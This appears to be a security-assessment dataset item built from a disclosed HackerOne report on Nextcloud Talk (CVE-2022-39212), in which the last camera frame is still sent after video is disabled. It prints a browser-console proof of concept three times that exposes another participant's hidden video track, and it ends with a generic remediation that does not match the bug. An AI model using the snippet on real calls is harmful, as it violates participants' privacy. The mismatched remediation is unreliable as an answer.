# INFO_DISCLOSURE — h1

- source: h1
- class: info_disclosure
- cwe: CWE-359
- cve: ['CVE-2022-39212']
- severity: medium
- program: nextcloud
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Last video frame is still sent after video is disabled in a call
**Affected Asset:** nextcloud/spreed

**Vulnerability Description:**
## Summary:
When a participant is in a call and that participant disables the video rather than a black frame the last frame of the video will be sent. Similarly, if the video is disabled before joining the call the last frame of the video before joining the call will be sent.

The video is not directly visible in the Web UI, as the received video is initially disabled and only shown once some media is received. However, it may be briefly visible in the Android app, as the Android app has the opposite behaviour, it assumes that the received video is enabled and then disables it once the video state is received. The iOS app has not been checked.

In any case, as the frame is sent it can be accessed in the WebUI by assigning the track to a manually created video element, as described in the steps below.

## Steps To Reproduce:
- In a browser, start a call with a camera selected but video disabled
- In a private window, join the call as a participant without microphone nor camera selected
- In the console of the private window, paste:
```
videoElement = document.createElement('video')
document.body.appendChild(videoElement)
videoElement.srcObject = new MediaStream()
videoElement.srcObject.addTrack(OCA.Talk.SimpleWebRTC.webrtc.peers[0].pc.getReceivers()[1].track)
videoElement.style.zIndex = 10000000
videoElement.style.position = 'absolute'
videoElement.style.top = 0
videoElement.play()
```

## Impact

An attacker could see the last video frame of any participant who has video disabled but a camera selected.

**Steps to Reproduce:**
- In a browser, start a call with a camera selected but video disabled
- In a private window, join the call as a participant without microphone nor camera selected
- In the console of the private window, paste:
```
videoElement = document.createElement('video')
document.body.appendChild(videoElement)
videoElement.srcObject = new MediaStream()
videoElement.srcObject.addTrack(OCA.Talk.SimpleWebRTC.webrtc.peers[0].pc.getReceivers()[1].track)
videoElement.style.zIndex = 10000000
videoElement.style.position = 'absolute'
videoElement.style.top = 0
videoElement.play()
```

**Proof of Concept:**
```
videoElement = document.createElement('video')
document.body.appendChild(videoElement)
videoElement.srcObject = new MediaStream()
videoElement.srcObject.addTrack(OCA.Talk.SimpleWebRTC.webrtc.peers[0].pc.getReceivers()[1].track)
videoElement.style.zIndex = 10000000
videoElement.style.position = 'absolute'
videoElement.style.top = 0
videoElement.play()
```

## Analysis / Response

**Vulnerability Class:** info_disclosure
**CWE:** CWE-359
**Weakness:** Privacy Violation
**Severity:** medium
**Endpoint Pattern:** https://github.com/nextcloud/security-advisories/security/advisories/GHSA-wq3g-2x46-q2gv

**Impact Assessment:**
An attacker could see the last video frame of any participant who has video disabled but a camera selected.

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-wq3g-2x46-q2gv

**Remediation:**
Remove sensitive data from error messages, headers, and responses. Implement proper access controls. Disable debug modes in production.
